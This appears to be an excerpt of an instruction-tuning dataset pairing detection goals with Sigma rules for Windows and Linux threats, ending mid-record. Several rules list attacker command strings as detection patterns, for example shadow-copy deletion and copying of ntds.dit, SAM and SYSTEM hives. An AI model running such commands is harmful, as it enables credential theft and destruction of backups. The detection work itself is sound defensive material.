    "instruction": "Build a Sigma rule with the goal of detecting potential overwriting and deletion of a file using DD..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential overwriting and deletion of a file using DD, you should: Monitor the creation of processes in Linux systems specifically for instances where the 'dd' command, located at '/bin/dd' or '/usr/bin/dd', is utilized. The detection focuses on commands that include 'of=' (indicating the output file destination), and ones where the input file is either '/dev/zero' or '/dev/null'. This setup aims to catch scenarios where the 'dd' command may be used inappropriately for overwriting or deleting files. Beware that there could be legitimate instances where a user employs this method for file management, hence these detections are considered of low severity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection1:\n        Image:\n            - '/bin/dd'\n            - '/usr/bin/dd'\n    selection2:\n        CommandLine|contains: 'of='\n    selection3:\n        CommandLine|contains:\n            - 'if=/dev/zero'\n            - 'if=/dev/null'\n    condition: all of selection*\nfalsepositives:\n    - Any user deleting files that way.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection1:\n        Image:\n            - '/bin/dd'\n            - '/usr/bin/dd'\n    selection2:\n        CommandLine|contains: 'of='\n    selection3:\n        CommandLine|contains:\n            - 'if=/dev/zero'\n            - 'if=/dev/null'\n    condition: all of selection*\nfalsepositives:\n    - Any user deleting files that way.\nlevel: low\n",
      "question": "potential overwriting and deletion of a file using DD.",
      "answer": "In order to detect potential overwriting and deletion of a file using DD, you should: Monitor the creation of processes in Linux systems specifically for instances where the 'dd' command, located at '/bin/dd' or '/usr/bin/dd', is utilized. The detection focuses on commands that include 'of=' (indicating the output file destination), and ones where the input file is either '/dev/zero' or '/dev/null'. This setup aims to catch scenarios where the 'dd' command may be used inappropriately for overwriting or deleting files. Beware that there could be legitimate instances where a user employs this method for file management, hence these detections are considered of low severity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting possible Kerberos Replay Attack on the domain controllers when \"KRB_AP_ERR_REPEAT\" Kerberos response is sent to the client.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect possible Kerberos Replay Attack on the domain controllers when \"KRB_AP_ERR_REPEAT\" Kerberos response is sent to the client, you should: Monitor Windows security event logs for Event ID 4649. This event signifies that a Kerberos ticket was presented more than once, which is a common indicator of a replay attack. It's important to note that this detection comes with a high level of importance due to the critical nature of the security event being monitored. Despite the possibility of unknown false positives, the high level suggests a strong emphasis on scrutinizing this event closely as it aligns with methods used in identity theft and defense evasion tactics.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: security\n    product: windows\ndetection:\n    selection:\n        EventID: 4649\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: security\n    product: windows\ndetection:\n    selection:\n        EventID: 4649\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "possible Kerberos Replay Attack on the domain controllers when \"KRB_AP_ERR_REPEAT\" Kerberos response is sent to the client",
      "answer": "In order to detect possible Kerberos Replay Attack on the domain controllers when \"KRB_AP_ERR_REPEAT\" Kerberos response is sent to the client, you should: Monitor Windows security event logs for Event ID 4649. This event signifies that a Kerberos ticket was presented more than once, which is a common indicator of a replay attack. It's important to note that this detection comes with a high level of importance due to the critical nature of the security event being monitored. Despite the possibility of unknown false positives, the high level suggests a strong emphasis on scrutinizing this event closely as it aligns with methods used in identity theft and defense evasion tactics."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries leveraging the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions, you should: Monitor Linux systems for specific execution events (EXECVE) triggered by auditd, focusing on commands such as 'users', 'w', and 'who'. These commands are commonly used for discovering information about users on the system. It would be prudent to consider activities involving these commands as needing scrutiny, though some might be legitimate administrative tasks. This monitoring can help in identifying initial reconnaissance efforts by adversaries trying to understand system ownership and user activities, which is crucial for their next steps in compromising the system or network. Notably, activities flagged by this approach carry a low risk level, indicating a likelihood of false positives, primarily due to legitimate administration work.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: 'EXECVE'\n        a0:\n            - 'users'\n            - 'w'\n            - 'who'\n    condition: selection\nfalsepositives:\n    - Admin activity\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: 'EXECVE'\n        a0:\n            - 'users'\n            - 'w'\n            - 'who'\n    condition: selection\nfalsepositives:\n    - Admin activity\nlevel: low\n",
      "question": "Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "answer": "In order to detect adversaries leveraging the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions, you should: Monitor Linux systems for specific execution events (EXECVE) triggered by auditd, focusing on commands such as 'users', 'w', and 'who'. These commands are commonly used for discovering information about users on the system. It would be prudent to consider activities involving these commands as needing scrutiny, though some might be legitimate administrative tasks. This monitoring can help in identifying initial reconnaissance efforts by adversaries trying to understand system ownership and user activities, which is crucial for their next steps in compromising the system or network. Notably, activities flagged by this approach carry a low risk level, indicating a likelihood of false positives, primarily due to legitimate administration work."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Get the processes that are running on the local computer..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to get the processes that are running on the local computer, you should: Monitor script block execution logs on Windows systems, specifically looking for instances where the text `Get-Process` appears within a PowerShell script. This technique requires that Script Block Logging be enabled to track and analyze PowerShell execution. It's important to be aware that there might be legitimate reasons for scripts to query running processes, which could lead to false positives. The risk associated with this specific activity is considered low.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: Get-Process\n    condition: selection\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: Get-Process\n    condition: selection\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: low\n",
      "question": "Get the processes that are running on the local computer.",
      "answer": "In order to get the processes that are running on the local computer, you should: Monitor script block execution logs on Windows systems, specifically looking for instances where the text `Get-Process` appears within a PowerShell script. This technique requires that Script Block Logging be enabled to track and analyze PowerShell execution. It's important to be aware that there might be legitimate reasons for scripts to query running processes, which could lead to false positives. The risk associated with this specific activity is considered low."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated Powershell via use MSHTA in Scripts.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to Detect Obfuscated Powershell via use MSHTA in Scripts, you should: Identify instances where certain command-line parameters appear together in the logs of process creation events on Windows systems. Specifically, look for occurrences where the command line includes all of the following elements: 'set', '&&', 'mshta', 'vbscript:createobject', '.run', and '(window.close)'. This combination suggests an attempt to execute obfuscated PowerShell scripts using MSHTA, a technique that attackers might use to bypass security measures and execute malicious code. It's important to note that there may be unknown false positives, indicating that not all detections might be malicious. However, given the high threat level associated with this behavior, any detection should be closely analyzed. This activity is aligned with tactics and techniques like Execution, Command and Scripting Interpreter, and Windows Management Instrumentation that attackers use for executing code on a compromised system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'set'\n            - '&&'\n            - 'mshta'\n            - 'vbscript:createobject'\n            - '.run'\n            - '(window.close)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'set'\n            - '&&'\n            - 'mshta'\n            - 'vbscript:createobject'\n            - '.run'\n            - '(window.close)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated Powershell via use MSHTA in Scripts",
      "answer": "In order to Detect Obfuscated Powershell via use MSHTA in Scripts, you should: Identify instances where certain command-line parameters appear together in the logs of process creation events on Windows systems. Specifically, look for occurrences where the command line includes all of the following elements: 'set', '&&', 'mshta', 'vbscript:createobject', '.run', and '(window.close)'. This combination suggests an attempt to execute obfuscated PowerShell scripts using MSHTA, a technique that attackers might use to bypass security measures and execute malicious code. It's important to note that there may be unknown false positives, indicating that not all detections might be malicious. However, given the high threat level associated with this behavior, any detection should be closely analyzed. This activity is aligned with tactics and techniques like Execution, Command and Scripting Interpreter, and Windows Management Instrumentation that attackers use for executing code on a compromised system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely, you should monitor for the execution of specific commands indicative of this type of malicious behavior. These commands include the use of `vssadmin.exe` to delete or create shadow copies, specifically targeting the C drive, and commands that attempt to copy the NTDS.dit and SAM files from shadow copies. Additionally, the use of `esentutl.exe` with arguments designed to copy or export the NTDS.dit, SAM, and SYSTEM files from shadow copies should be closely watched. This monitoring should be focused on Windows environments, particularly looking at process creation logs. \n\nThe detection of such commands being executed is a strong indicator of an attacker's attempt to access sensitive account information through volume shadow copy service (VSS). Tags associated with this kind of attack would include \"Credential Access\" and \"Persistence\", due to the typical goal of obtaining and potentially manipulating account information for ongoing access. The level of alert for these detections is considered high, given the severe implications of an attacker successfully stealing NTDS.dit hashes.\n\nAdministrative activities could potentially trigger false positives, as legitimate admin work may involve some of these commands for backup or repair purposes. It is crucial to evaluate the context in which these commands are executed, including the parent command line processes, to effectively differentiate between malicious activity and legitimate administrative tasks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - 'vssadmin.exe Delete Shadows'\n            - 'vssadmin create shadow /for=C:'\n            - 'copy \\\\?\\GLOBALROOT\\Device\\\\*\\windows\\ntds\\ntds.dit'\n            - 'copy \\\\?\\GLOBALROOT\\Device\\\\*\\config\\SAM'\n            - 'vssadmin delete shadows /for=C:'\n            - 'reg SAVE HKLM\\SYSTEM '\n            - 'esentutl.exe /y /vss *\\ntds.dit*'\n            - 'esentutl.exe /y /vss *\\SAM'\n            - 'esentutl.exe /y /vss *\\SYSTEM'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - 'vssadmin.exe Delete Shadows'\n            - 'vssadmin create shadow /for=C:'\n            - 'copy \\\\?\\GLOBALROOT\\Device\\\\*\\windows\\ntds\\ntds.dit'\n            - 'copy \\\\?\\GLOBALROOT\\Device\\\\*\\config\\SAM'\n            - 'vssadmin delete shadows /for=C:'\n            - 'reg SAVE HKLM\\SYSTEM '\n            - 'esentutl.exe /y /vss *\\ntds.dit*'\n            - 'esentutl.exe /y /vss *\\SAM'\n            - 'esentutl.exe /y /vss *\\SYSTEM'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: high\n",
      "question": "suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely",
      "answer": "In order to detect suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely, you should monitor for the execution of specific commands indicative of this type of malicious behavior. These commands include the use of `vssadmin.exe` to delete or create shadow copies, specifically targeting the C drive, and commands that attempt to copy the NTDS.dit and SAM files from shadow copies. Additionally, the use of `esentutl.exe` with arguments designed to copy or export the NTDS.dit, SAM, and SYSTEM files from shadow copies should be closely watched. This monitoring should be focused on Windows environments, particularly looking at process creation logs. \n\nThe detection of such commands being executed is a strong indicator of an attacker's attempt to access sensitive account information through volume shadow copy service (VSS). Tags associated with this kind of attack would include \"Credential Access\" and \"Persistence\", due to the typical goal of obtaining and potentially manipulating account information for ongoing access. The level of alert for these detections is considered high, given the severe implications of an attacker successfully stealing NTDS.dit hashes.\n\nAdministrative activities could potentially trigger false positives, as legitimate admin work may involve some of these commands for backup or repair purposes. It is crucial to evaluate the context in which these commands are executed, including the parent command line processes, to effectively differentiate between malicious activity and legitimate administrative tasks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting scenarios where one can control another users or computers account without having to use their credentials..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect scenarios where one can control another users or computers account without having to use their credentials, you should: Focus on monitoring Windows security event logs, specifically looking for significant events that could indicate unauthorized control or delegation attempts. You should setup your system to audit User Account Management and Directory Service Changes as detailed by Windows Audit Policies and Group Policy configurations. \n\nSpecifically, look out for event ID 4738 in security logs, which signals modifications to an account that could be malicious, especially if the 'AllowedToDelegateTo' attribute is not set to null or has been altered, indicating an attempt to delegate control.\n\nAdditionally, you should pay attention to event ID 5136, which gets raised when changes occur to directory service objects. There are three critical scenarios to watch out for:\n1. Modifications to the 'msDS-AllowedToDelegateTo' attribute, which could indicate attempts to permit unauthorized delegations.\n2. Changes to the 'servicePrincipalName' attribute for user objects, which could signify manipulation of service accounts to impersonate or control other accounts.\n3. Alterations to the 'msDS-AllowedToActOnBehalfOfOtherIdentity' attribute, further pointing towards attempts to gain unauthorized control or impersonation capabilities.\n\nWhile monitoring these activities, it's important to understand there might be unknown scenarios that could trigger these events, which should be considered potential false positives. Since the detection level is set to high, any triggered alerts should be investigated thoroughly to confirm if they signify malicious activity or are benign system or user actions. \n\nThis detailed monitoring strategy is designed to protect against tactics and techniques such as privilege escalation and credential access by catching unauthorized attempts to gain control over other users' or computers' accounts without needing their actual credentials.\n",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management, DS Access > Audit Directory Service Changes, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\DS Access\\Audit Directory Service Changes'\ndetection:\n    selection1:\n        EventID: 4738\n    filter_null:\n        - AllowedToDelegateTo: '-'\n        - AllowedToDelegateTo:\n    selection_5136_1:\n        EventID: 5136\n        AttributeLDAPDisplayName: 'msDS-AllowedToDelegateTo'\n    selection_5136_2:\n        EventID: 5136\n        ObjectClass: 'user'\n        AttributeLDAPDisplayName: 'servicePrincipalName'\n    selection_5136_3:\n        EventID: 5136\n        AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity'\n    condition: (selection1 and not filter_null) or 1 of selection_5136_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management, DS Access > Audit Directory Service Changes, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\DS Access\\Audit Directory Service Changes'\ndetection:\n    selection1:\n        EventID: 4738\n    filter_null:\n        - AllowedToDelegateTo: '-'\n        - AllowedToDelegateTo:\n    selection_5136_1:\n        EventID: 5136\n        AttributeLDAPDisplayName: 'msDS-AllowedToDelegateTo'\n    selection_5136_2:\n        EventID: 5136\n        ObjectClass: 'user'\n        AttributeLDAPDisplayName: 'servicePrincipalName'\n    selection_5136_3:\n        EventID: 5136\n        AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity'\n    condition: (selection1 and not filter_null) or 1 of selection_5136_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "scenarios where one can control another users or computers account without having to use their credentials.",
      "answer": "In order to detect scenarios where one can control another users or computers account without having to use their credentials, you should: Focus on monitoring Windows security event logs, specifically looking for significant events that could indicate unauthorized control or delegation attempts. You should setup your system to audit User Account Management and Directory Service Changes as detailed by Windows Audit Policies and Group Policy configurations. \n\nSpecifically, look out for event ID 4738 in security logs, which signals modifications to an account that could be malicious, especially if the 'AllowedToDelegateTo' attribute is not set to null or has been altered, indicating an attempt to delegate control.\n\nAdditionally, you should pay attention to event ID 5136, which gets raised when changes occur to directory service objects. There are three critical scenarios to watch out for:\n1. Modifications to the 'msDS-AllowedToDelegateTo' attribute, which could indicate attempts to permit unauthorized delegations.\n2. Changes to the 'servicePrincipalName' attribute for user objects, which could signify manipulation of service accounts to impersonate or control other accounts.\n3. Alterations to the 'msDS-AllowedToActOnBehalfOfOtherIdentity' attribute, further pointing towards attempts to gain unauthorized control or impersonation capabilities.\n\nWhile monitoring these activities, it's important to understand there might be unknown scenarios that could trigger these events, which should be considered potential false positives. Since the detection level is set to high, any triggered alerts should be investigated thoroughly to confirm if they signify malicious activity or are benign system or user actions. \n\nThis detailed monitoring strategy is designed to protect against tactics and techniques such as privilege escalation and credential access by catching unauthorized attempts to gain control over other users' or computers' accounts without needing their actual credentials.\n"
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious parent processes that should not have any children or should only have a single possible child program.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious parent processes that should not have any children or should only have a single possible child program, you should:\n\nFocus on monitoring process creation activities on Windows systems. Your detection strategy involves identifying when specific applications, that generally do not spawn child processes during regular operation, unusually initiate a child process. Specifically, look out for instances where 'minesweeper.exe', 'winver.exe', or 'bitsadmin.exe' serve as parent images for any child processes. Moreover, a special emphasis is placed on situations where 'csrss.exe', 'certutil.exe', 'eventvwr.exe', 'calc.exe', and 'notepad.exe' act as parent images, due to their typical usage patterns or functions within the operating system.\n\nHowever, be aware of and exclude from alerts certain child processes such as 'WerFault.exe', 'wermgr.exe', 'conhost.exe', 'mmc.exe', 'win32calc.exe', and 'notepad.exe' following specific parents like 'csrss.exe', 'certutil.exe', 'eventvwr.exe', and 'calc.exe', as these combinations are common and can be legitimate under particular circumstances. This refined approach helps to reduce the risk of flagging benign activity as suspicious, reducing the volume of false positives.\n\nThis targeted monitoring is anchored in responding to tactics and techniques associated with persistence, privilege escalation, and defense evasion by malicious actors, as these actions often require manipulation of parent-child process relationships to execute unauthorized or malicious code under the guise of legitimate system or software operations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\minesweeper.exe'\n            - '\\winver.exe'\n            - '\\bitsadmin.exe'\n    selection_special:\n        ParentImage|endswith:\n            - '\\csrss.exe'\n            - '\\certutil.exe'\n         # - '\\schtasks.exe'\n            - '\\eventvwr.exe'\n            - '\\calc.exe'\n            - '\\notepad.exe'\n    filter_special:\n        Image|endswith:\n            - '\\WerFault.exe'\n            - '\\wermgr.exe'\n            - '\\conhost.exe' # csrss.exe, certutil.exe\n            - '\\mmc.exe'     # eventvwr.exe\n            - '\\win32calc.exe' # calc.exe\n            - '\\notepad.exe'\n    filter_null:\n        Image: null\n    condition: selection or ( selection_special and not 1 of filter_* )\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\minesweeper.exe'\n            - '\\winver.exe'\n            - '\\bitsadmin.exe'\n    selection_special:\n        ParentImage|endswith:\n            - '\\csrss.exe'\n            - '\\certutil.exe'\n         # - '\\schtasks.exe'\n            - '\\eventvwr.exe'\n            - '\\calc.exe'\n            - '\\notepad.exe'\n    filter_special:\n        Image|endswith:\n            - '\\WerFault.exe'\n            - '\\wermgr.exe'\n            - '\\conhost.exe' # csrss.exe, certutil.exe\n            - '\\mmc.exe'     # eventvwr.exe\n            - '\\win32calc.exe' # calc.exe\n            - '\\notepad.exe'\n    filter_null:\n        Image: null\n    condition: selection or ( selection_special and not 1 of filter_* )\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious parent processes that should not have any children or should only have a single possible child program",
      "answer": "In order to detect suspicious parent processes that should not have any children or should only have a single possible child program, you should:\n\nFocus on monitoring process creation activities on Windows systems. Your detection strategy involves identifying when specific applications, that generally do not spawn child processes during regular operation, unusually initiate a child process. Specifically, look out for instances where 'minesweeper.exe', 'winver.exe', or 'bitsadmin.exe' serve as parent images for any child processes. Moreover, a special emphasis is placed on situations where 'csrss.exe', 'certutil.exe', 'eventvwr.exe', 'calc.exe', and 'notepad.exe' act as parent images, due to their typical usage patterns or functions within the operating system.\n\nHowever, be aware of and exclude from alerts certain child processes such as 'WerFault.exe', 'wermgr.exe', 'conhost.exe', 'mmc.exe', 'win32calc.exe', and 'notepad.exe' following specific parents like 'csrss.exe', 'certutil.exe', 'eventvwr.exe', and 'calc.exe', as these combinations are common and can be legitimate under particular circumstances. This refined approach helps to reduce the risk of flagging benign activity as suspicious, reducing the volume of false positives.\n\nThis targeted monitoring is anchored in responding to tactics and techniques associated with persistence, privilege escalation, and defense evasion by malicious actors, as these actions often require manipulation of parent-child process relationships to execute unauthorized or malicious code under the guise of legitimate system or software operations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting command used by conti to find volume shadow backups.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a command used by conti to find volume shadow backups, you should: Monitor for the creation of processes on Windows systems where the command line includes both the use of 'vssadmin list shadows' and 'log.txt'. This indicates the execution of a command that is often associated with adversaries, such as conti, attempting to discover volume shadow backups, potentially in preparation for their deletion or manipulation. This process creation event should be logged and include details such as the user account executing the command, the exact command line used, and the parent process image. Be aware that while this behavior can strongly indicate malicious activity, there might be scenarios where it does not relate to an attack, though such instances are considered unknown. The detection of this activity is deemed to be of high importance due to its potential impact on an organization's ability to recover from an attack that involves ransomware or data destruction.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'vssadmin list shadows'\n            - 'log.txt'\n    condition: selection\nfields:\n    - User\n    - CommandLine\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'vssadmin list shadows'\n            - 'log.txt'\n    condition: selection\nfields:\n    - User\n    - CommandLine\n    - ParentImage\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "command used by conti to find volume shadow backups",
      "answer": "In order to detect a command used by conti to find volume shadow backups, you should: Monitor for the creation of processes on Windows systems where the command line includes both the use of 'vssadmin list shadows' and 'log.txt'. This indicates the execution of a command that is often associated with adversaries, such as conti, attempting to discover volume shadow backups, potentially in preparation for their deletion or manipulation. This process creation event should be logged and include details such as the user account executing the command, the exact command line used, and the parent process image. Be aware that while this behavior can strongly indicate malicious activity, there might be scenarios where it does not relate to an attack, though such instances are considered unknown. The detection of this activity is deemed to be of high importance due to its potential impact on an organization's ability to recover from an attack that involves ransomware or data destruction."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious changes to the Windows Defender configuration.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious changes to the Windows Defender configuration, you should monitor for specific modifications made to the Windows Defender\u2019s settings that could undermine the system's security integrity. This includes changes logged in Windows Defender's operational logs under the service name 'windefend', specifically with an event ID 5007, which denotes that the antimalware platform's configuration has been altered. Key changes to watch for include the disabling of AntiSpyware, the disabling of removable drive scanning, the disabling of scanning mapped network drives for a full scan, the disabling of block at first seen in SpyNet, changes to SpyNet reporting settings, and modifications to the consent level for submitting samples to Microsoft for analysis. These modifications are critical to monitor as they can significantly lower the protective measures of Windows Defender, making the system more vulnerable to malware and other cyber threats. It\u2019s also important to note that while administrator activity might account for some changes and could initially be considered as false positives, such activity still requires investigation to ensure it's not malicious. Monitoring these changes is crucial for maintaining the security posture of a Windows-based system and is associated with tactics and techniques like defense evasion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: windefend\ndetection:\n    selection:\n        EventID: 5007 # The antimalware platform configuration changed.\n        NewValue|contains:\n            # TODO: Add more suspicious values\n            - '\\Windows Defender\\DisableAntiSpyware '\n            #- '\\Windows Defender\\Features\\TamperProtection ' # Might produce FP\n            - '\\Windows Defender\\Scan\\DisableRemovableDriveScanning '\n            - '\\Windows Defender\\Scan\\DisableScanningMappedNetworkDrivesForFullScan '\n            - '\\Windows Defender\\SpyNet\\DisableBlockAtFirstSeen '\n            - '\\Real-Time Protection\\SpyNetReporting '\n            - '\\Real-Time Protection\\SubmitSamplesConsent '\n            # Exclusions changes are covered in 1321dc4e-a1fe-481d-a016-52c45f0c8b4f\n            # Exploit guard changes are covered in a3ab73f1-bd46-4319-8f06-4b20d0617886\n    condition: selection\nfalsepositives:\n    - Administrator activity (must be investigated)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: windefend\ndetection:\n    selection:\n        EventID: 5007 # The antimalware platform configuration changed.\n        NewValue|contains:\n            # TODO: Add more suspicious values\n            - '\\Windows Defender\\DisableAntiSpyware '\n            #- '\\Windows Defender\\Features\\TamperProtection ' # Might produce FP\n            - '\\Windows Defender\\Scan\\DisableRemovableDriveScanning '\n            - '\\Windows Defender\\Scan\\DisableScanningMappedNetworkDrivesForFullScan '\n            - '\\Windows Defender\\SpyNet\\DisableBlockAtFirstSeen '\n            - '\\Real-Time Protection\\SpyNetReporting '\n            - '\\Real-Time Protection\\SubmitSamplesConsent '\n            # Exclusions changes are covered in 1321dc4e-a1fe-481d-a016-52c45f0c8b4f\n            # Exploit guard changes are covered in a3ab73f1-bd46-4319-8f06-4b20d0617886\n    condition: selection\nfalsepositives:\n    - Administrator activity (must be investigated)\nlevel: high\n",
      "question": "suspicious changes to the Windows Defender configuration",
      "answer": "In order to detect suspicious changes to the Windows Defender configuration, you should monitor for specific modifications made to the Windows Defender\u2019s settings that could undermine the system's security integrity. This includes changes logged in Windows Defender's operational logs under the service name 'windefend', specifically with an event ID 5007, which denotes that the antimalware platform's configuration has been altered. Key changes to watch for include the disabling of AntiSpyware, the disabling of removable drive scanning, the disabling of scanning mapped network drives for a full scan, the disabling of block at first seen in SpyNet, changes to SpyNet reporting settings, and modifications to the consent level for submitting samples to Microsoft for analysis. These modifications are critical to monitor as they can significantly lower the protective measures of Windows Defender, making the system more vulnerable to malware and other cyber threats. It\u2019s also important to note that while administrator activity might account for some changes and could initially be considered as false positives, such activity still requires investigation to ensure it's not malicious. Monitoring these changes is crucial for maintaining the security posture of a Windows-based system and is associated with tactics and techniques like defense evasion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when ForceV1 asks for information directly from the kernel space, and Conhost connects to the console application, with the implication that the process is running with elevated privileges such as in an Administrator context, you should: Monitor Windows process creation logs for any instance where a process is created with a High Integrity Level, and its command line includes all of the following elements: 'conhost.exe', '0xffffffff', and '-ForceV1'. These elements indicate an operation that directly interacts with kernel space, which could be suspect if not part of standard administrative tasks. However, it's essential to note that detecting this activity can result in very likely false positives, especially in cases where cmd.exe is launched with administrative privileges. This detection is mainly for informational purposes to highlight potential areas of concern rather than definitive malicious activity without further context.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        IntegrityLevel: 'High'\n        CommandLine|contains|all:\n            - 'conhost.exe'\n            - '0xffffffff'\n            - '-ForceV1'\n    condition: selection\nfalsepositives:\n    - Very Likely, including launching cmd.exe via Run As Administrator\nlevel: informational\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
